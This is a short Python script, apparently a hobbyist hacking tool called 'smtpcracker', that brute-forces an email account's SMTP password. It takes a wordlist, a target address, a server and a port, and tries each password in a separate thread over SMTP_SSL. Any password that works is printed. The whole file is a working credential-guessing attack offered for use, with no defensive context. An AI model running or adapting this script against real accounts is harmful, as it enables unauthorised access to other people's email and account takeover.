#By s0ck37
#Args: python3 smtpcracker.py wordlist.txt emailtocrack@domain.com smtp.example.server port

import smtplib,sys,threading
from colorama import Fore,Style,Back
from pyfiglet import Figlet

def main():
    banner = Figlet(font='big')
    print(Style.BRIGHT + Fore.RED + banner.renderText("smtpcracker")+ Style.NORMAL + Fore.RESET)
    dict = open(sys.argv[1] , "r")
    pwds = dict.readlines()
    for pwd in pwds:
        x = threading.Thread(target=try_login, args=(sys.argv[2],str(pwd).replace("\n","")))
        x.start()
    dict.close()

def try_login(usr,pwd):
    server = smtplib.SMTP_SSL(sys.argv[3],int(sys.argv[4]))
    try:
        server.login(usr,pwd)
        print(Fore.BLUE + "[+] Password matched: "+ Fore.RED + pwd+ Fore.RESET)
        matched = True
        server.quit()
    except:
        server.quit()
        pass

main()
